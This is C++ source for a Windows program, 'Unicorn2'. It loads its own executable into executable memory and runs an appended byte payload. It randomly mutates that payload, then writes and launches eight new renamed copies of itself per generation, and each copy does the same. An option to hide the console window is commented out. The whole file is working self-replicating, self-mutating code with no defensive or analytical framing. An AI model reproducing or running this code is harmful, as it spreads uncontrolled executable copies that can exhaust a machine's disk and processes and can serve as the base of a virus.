// Unicorn2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#include <stdio.h>
#include <Windows.h>
#include <sys\timeb.h>
#include "Unicorn2.h"

int NextPayloadSize = 32768;
#define NextNum 8
#define GapTime 4096

int myEXESize = 0;
int myStaticLength = 0;
int myPayloadLength = 0;
UINT8* myFileBuffer = 0;
UINT8* nextPayloadBuf = 0;
int MuPos = 0;
int MuWatchDog = 0;

char nextEXEName[256] = { 0 };
char **global_argv = 0;

void GenNxtPayload();
void MuNxtPayload();

void PopCtl(void);

int main(int argc, char** argv)
{
    global_argv = argv;
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PopCtl, 0, 0, 0);
    FILE* fp = fopen(argv[0], "rb");
    fseek(fp, 0, SEEK_END);
    myEXESize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    myFileBuffer = (UINT8*)VirtualAlloc(0, myEXESize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    fread(myFileBuffer, 1, myEXESize, fp);
    fclose(fp); fp = NULL;
    for (int i = 0; i < myEXESize - 3; i++)
        if (myFileBuffer[i] == 0x23 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90 && myFileBuffer[i + 3] == 0x90)
        {
            printf("Found Payload Start @ 0x%X\n", i);
            myStaticLength = i;
            
            nextPayloadBuf = myFileBuffer + i;
            NextPayloadSize = myEXESize - i;

            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(nextPayloadBuf + 1), 0, 0, 0);
            break;
        }
    if (myStaticLength == 0) // This is the first gen
    {
        myStaticLength = myEXESize;
        nextPayloadBuf = (UINT8*)VirtualAlloc(0, NextPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        nextPayloadBuf[0] = 0x23;
        for (int i = 1; i < NextPayloadSize - 1; i++)
        {
            nextPayloadBuf[i] = 0x90; // NOP
        }
        nextPayloadBuf[NextPayloadSize - 1] = 0xC3; // RET
    }

    for (int i = 0; i < NextNum; i++)
    {
        HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MuNxtPayload, 0, 0, 0);
        while(WaitForSingleObject(hThread, GapTime) == WAIT_TIMEOUT) // Thread is still alive
        {
            if (time(NULL) - MuWatchDog > 10)
            {
                printf("Mutation Watchdog Timeout, revert x86 code\n");
                for(int i=0; i<x86MaxInsLen; i++)
                {
                    nextPayloadBuf[MuPos + i] = BackupBuf[i];
                }
            }
            else
            {
                printf("Good Mutation Thread\n");
            }
        }
        CloseHandle(hThread);
        
        while (fp == NULL)
        {
            sprintf(nextEXEName, "Unicorn2-%X.exe", Get_Hardware_Rand() & 0xFFFF);
            fp = fopen(nextEXEName, "wb");
        }
        fwrite(myFileBuffer, 1, myStaticLength, fp);
        fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
        Sleep(GapTime); // Delay is important here to avoid producing so fast
        fclose(fp); fp = NULL; // Unlock the file
        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
    }
}